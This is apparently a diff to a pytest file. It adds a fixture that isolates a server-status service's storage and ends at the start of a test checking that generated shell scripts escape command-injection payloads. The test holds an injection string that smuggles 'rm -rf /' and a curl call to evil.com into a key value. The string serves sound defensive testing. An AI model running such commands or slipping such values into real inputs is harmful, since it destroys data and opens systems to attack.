@@ -8,6 +8,22 @@ import pytest
 from core.server_status_service import server_status_service, ServerStatusService
 
 
+@pytest.fixture(autouse=True)
+def isolate_server_status_storage(monkeypatch, tmp_path):
+    temp_file = str(tmp_path / "server_status_records.json")
+    monkeypatch.setattr("core.server_status_service._STORAGE_FILE", temp_file)
+    from core.server_status_service import _pushed_server_data, _server_aliases
+    orig_records = dict(_pushed_server_data)
+    orig_aliases = dict(_server_aliases)
+    _pushed_server_data.clear()
+    _server_aliases.clear()
+    yield
+    _pushed_server_data.clear()
+    _pushed_server_data.update(orig_records)
+    _server_aliases.clear()
+    _server_aliases.update(orig_aliases)
+
+
 def test_generate_shell_script_escapes_command_injection_payloads():
     # 构造攻击载荷，企图闭合双引号并执行任意系统命令
     malicious_key = 'test"; rm -rf /; curl evil.com; "'
